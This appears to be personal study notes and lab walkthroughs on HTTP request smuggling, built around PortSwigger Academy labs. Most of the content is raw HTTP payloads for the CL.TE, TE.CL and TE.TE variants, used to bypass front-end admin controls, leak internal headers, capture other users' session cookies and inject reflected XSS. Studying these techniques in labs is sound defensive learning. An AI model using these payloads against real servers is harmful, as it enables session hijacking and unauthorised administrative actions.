---
description: >-
  Parsing of Content-Length and Transfer-Encoding headers leads to messing with
  boundaries of requests
---

# HTTP Request Smuggling

{% hint style="info" %}
**Note**: This page was made as notes while learning HTTP Request Smuggling myself, using the Portswigger resources and labs
{% endhint %}

## Description

{% embed url="https://portswigger.net/web-security/request-smuggling" %}
Portswigger **explaining** what HTTP Request Smuggling is
{% endembed %}

HTTP Request Smuggling is possible when the parsing of `Content-Length` and `Transfer-Encoding: chunked` headers are different for front-end and back-end servers.

### Types

| Name      | Front-end           | Back-end            |
| --------- | ------------------- | ------------------- |
| **CL.TE** | `Content-Length`    | `Transfer-Encoding` |
| **TE.CL** | `Transfer-Encoding` | `Content-Length`    |
| **TE.TE** | `Transfer-Encoding` | `Transfer-Encoding` |

{% hint style="info" %}
**TE.TE**: `Transfer-Encoding` front-end, `Transfer-Encoding` backend, but one can be tricked into using `Content-Length` by obfuscating `Transfer-Encoding` header
{% endhint %}

### Impact

* Smuggle HTTP in front of the next request by someone else
* Smuggle another request through front-end to back-end to bypass filters

## Types

### CL.TE

{% embed url="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" %}
Portswigger **lab** for practicing CL.TE type
{% endembed %}

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The front-end uses `Content-Length: 6` which sends the whole body (`0\r\nG\r`) to the back-end. The back-end uses `Transfer-Encoding: chunked` which will read the first `0` and then stop because this signals the end. When anyone now does another request to the back-end, the `G` is already sent and prepended to it making the request `GPOST` if it was a `POST` before.

### TE.CL

{% embed url="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" %}
Portswigger **lab** for practicing TE.CL type
{% endembed %}

> Burp Suite automatically fixes `Content-Length`, but it only is correct for the back-end after splitting the request. So turn off "Update Content-Length" setting in Repeater

```http
POST /post/comment HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

61
GPOST /post/comment HTTP/1.1
Host: your-lab-id.web-security-academy.net


0


```

The front-end takes `Transfer-Encoding: chunked`, so it sends the whole body to back-end. Then the back-end takes `Content-Length: 4` and only reads the first `61\r` bytes. The back-end server gives a response that the request does not contain the right parameters but this does not matter. Next, the `GPOST` is also sent to the back-end and when anyone now does another request to the back-end, it will respond with the already done `GPOST` answer.

### TE.TE

{% embed url="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header" %}
Portswigger **lab** for practicing TE.TE type
{% endembed %}

Ways to confuse front-end and back-end:

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Depending on if the front-end or back-end uses the `Transfer-Encoding` it can become either CL.TE or TE.CL

#### Solution to the lab:

First tested TE.CL, and with double `Transfer-Encoding` header got a proxy timeout. This could be because one of the servers is waiting for more bytes, but not getting them.

```http
POST /post/comment HTTP/1.1
Host: 0a2d00fc03652cc4c04d3dae004e00af.web-security-academy.net
Content-Length: 4
Transfer-Encoding: x
Transfer-Encoding: chunked

61
GPOST /post/comment HTTP/1.1
Host: 0a2d00fc03652cc4c04d3dae004e00af.web-security-academy.net

0


```

If front-end uses `Content-Length: 4` it only sends `61\r` to the back-end. If the back-end then uses `Transfer-Encoding` it would see the `61` and wait for 97 more bytes, which it is not getting from the proxy causing a timeout. This would mean it is a CL.TE type instead. Trying the same with a CL.TE payload confirms this by solving the lab:

```http
POST /post/comment HTTP/1.1
Host: 0a2d00fc03652cc4c04d3dae004e00af.web-security-academy.net
Content-Length: 6
Transfer-Encoding: x
Transfer-Encoding: chunked

0

G
```

## Confirming Request Smuggling

{% embed url="https://portswigger.net/web-security/request-smuggling/finding" %}
Portswigger **explaining** how to config this attack
{% endembed %}

### CL.TE

{% embed url="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses" %}
Portswigger **lab** for practicing CL.TE and confirming it seeing a different response
{% endembed %}

Specify the requested location with `GET /404`, which will append cookies, etc. to the request making a GET CSRF

```http
POST /post/comment HTTP/1.1
Host: 0ab8007103cb9890c061ef89005300ad.web-security-academy.net
Content-Length: 28
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X: X
```

### TE.CL

{% embed url="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses" %}
Portswigger **lab** for practicing TE.CL and confirming it seeing a different response
{% endembed %}

Same idea as CL.TE, with `x=` in the body because the `0` will also be prepended to the next request. A lonely 0 in the next request would not be a valid header, so it needs to be the body.

```http
POST /post/comment HTTP/1.1
Host: 0a3d00e204916fbbc028023900de0074.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

9d
GET /404 HTTP/1.1
Host: 0a3d00e204916fbbc028023900de0074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0


```

## Exploiting

{% embed url="https://portswigger.net/web-security/request-smuggling/exploiting" %}
Portswigger **explaining** how to exploit a HTTP Request Smuggling attack in a practical scenario
{% endembed %}

### CL.TE

{% embed url="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" %}
Portswigger **lab** for performing CSRF using CL.TE
{% endembed %}

We can provide a complete HTTP request to prepend the next request by any victim. We can bypass front-end filters by sending an allowed request in the attack request, and an unauthorized request in the normal request that we smuggle. To make sure the headers from the original request don't interfere we can put it in a body like seen below:

```http
POST /post/comment HTTP/1.1
Host: 0a81003103886215c0150d01000b0097.web-security-academy.net
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
```

### TE.CL

{% embed url="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" %}
Portswigger **lab** for performing CSRF using TE.CL
{% endembed %}

Same as confirming TE.CL

```http
POST /post/comment HTTP/1.1
Host: 0abb004d04e98969c1810092007c00eb.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

86
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0


```

### Leaking headers

{% embed url="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" %}
Portswigger **lab** for leaking internal headers with HTTP Request Smuggling
{% endembed %}

Leak data in comment content. Put `comment=` last to make the next request get appended and read as part of the comment. Make sure to use long `Content-Length` but not too long.

```http
POST /post/comment HTTP/1.1
Host: 0af200a104c3ef7bc068832d001b00ff.web-security-academy.net
Content-Length: 316
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0af200a104c3ef7bc068832d001b00ff.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=Q9Ra3PMynaM4qv23aTWPITOPBaYvqYB9
Content-Length: 200

csrf=YvyCU73Jt8tqxDbiZ11WaMbofDCpyVI7&postId=6&name=server&email=emal@d.d&website=&comment=leak
```

Now the page shows the `X-mxqMOU-Ip` header

```http
leakGET / HTTP/1.1 X-mxqMOU-Ip: 82.74.120.62 Host: 0af200a104c3ef7bc068832d001b00ff.web-security-academy.ne
```

Use this header like before to make a request look like it was valid from the front-end

```http
POST /post/comment HTTP/1.1
Host: 0af200a104c3ef7bc068832d001b00ff.web-security-academy.net
Content-Length: 211
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: 0af200a104c3ef7bc068832d001b00ff.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
X-mxqMOU-Ip: 127.0.0.1

x=
```

### Leaking cookies from other users

{% embed url="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" %}
Portswigger **lab** for leaking cookies from other users
{% endembed %}

> This type of attack can also be used to leak `Cookie`s from requests from other users, by storing the data is a comment for example. The `Content-Length` needs to be perfect though, to find the entire cookie

```http
POST /post/comment HTTP/1.1
Host: 0a560094034333f3c0a51a2c00dd0027.web-security-academy.net
Content-Length: 315
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

POST /post/comment HTTP/1.1
Host: 0a560094034333f3c0a51a2c00dd0027.web-security-academy.net
Content-Length: 806
Cookie: session=IyDgegJn5pvpxeO7vkMC1Iydonlav5jb
Content-Type: application/x-www-form-urlencoded

csrf=4Aj33NnmRAndszvq5fEyTFBl9azQCxef&postId=3&name=name&email=email@d.d&website=&comment=leak
```

```
leakGET / HTTP/1.1 Host: 0a560094034333f3c0a51a2c00dd0027.web-security-academy.net Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: en-US Cookie: victim-fingerprint=zaSVR3HxS6nNgzvQkfktkk4dIrca0LI7; secret=YR3JdIRPEfOt8RibS8hhfRQphpxLFzeH; session=0ANQ8MLDM5n54ah26iXuhxKNERfTGtr3
```

```http
GET /my-account HTTP/1.1
Host: 0a560094034333f3c0a51a2c00dd0027.web-security-academy.net
Cookie: victim-fingerprint=zaSVR3HxS6nNgzvQkfktkk4dIrca0LI7; secret=YR3JdIRPEfOt8RibS8hhfRQphpxLFzeH; session=0ANQ8MLDM5n54ah26iXuhxKNERfTGtr3
```

### Set headers on victim request to get XSS

{% embed url="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" %}
Portswigger **lab** for changing the request from a victim to return XSS
{% endembed %}

```http
POST /post/comment HTTP/1.1
Host: 0a2b004204969863c0e7238600e70055.web-security-academy.net
Content-Length: 79
Transfer-Encoding: chunked

0

GET /post?postId=9 HTTP/1.1
User-Agent: "><script>alert(1)</script>
X: X
```
